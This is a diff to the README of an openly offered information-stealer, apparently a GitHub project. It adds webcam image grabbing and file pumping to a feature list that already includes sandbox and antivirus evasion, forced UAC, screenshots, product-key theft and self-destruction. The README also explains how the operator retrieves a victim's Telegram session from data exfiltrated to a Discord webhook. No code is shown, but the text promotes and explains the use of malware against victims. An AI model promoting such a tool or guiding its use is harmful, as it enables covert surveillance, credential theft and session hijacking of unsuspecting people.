@@ -46,6 +46,7 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 
 #  Features
 - [x] GUI Builder
+- [x] File Pumper
 - [x] [Mutex](https://learn.microsoft.com/en-us/dotnet/api/system.threading.mutex?view=net-7.0) (single instance)
 - [x] Force [UAC](https://learn.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)
 - [x] Anti-Analysis ```VMWare, VirtualBox, Sandboxes, Emulators, Debuggers, Virustotal, Any.run```
@@ -65,7 +66,7 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 - [x] Get System Information (Version, CPU, DISK, GPU, RAM, IP, Installed Apps etc.)
 - [x] Takes Desktop Screenshot  
 - [x] Get System Uptime 
-- [X] Get Screen Resolution
+- [x] Get Screen Resolution
 - [x] List of Installed Applications
 - [x] List of Installed Antiviruses
 - [x] List of all Network Adapters
@@ -74,6 +75,7 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 - [x] List TCP Connections and Underlying Process
 - [x] Extracts Product Key
 - [x] Self-Destructs After Execution (optional)
+- [x] Webcam Image Grabber
 
 ### Telegram Session Stealer Usage :
 After the exfiltrated data is uploaded to your discord webhook, download the compressed file ```KDOT.zip```, inside that folder there will also be another zipped folder ```telegram-session.zip``` extract it on your PC.
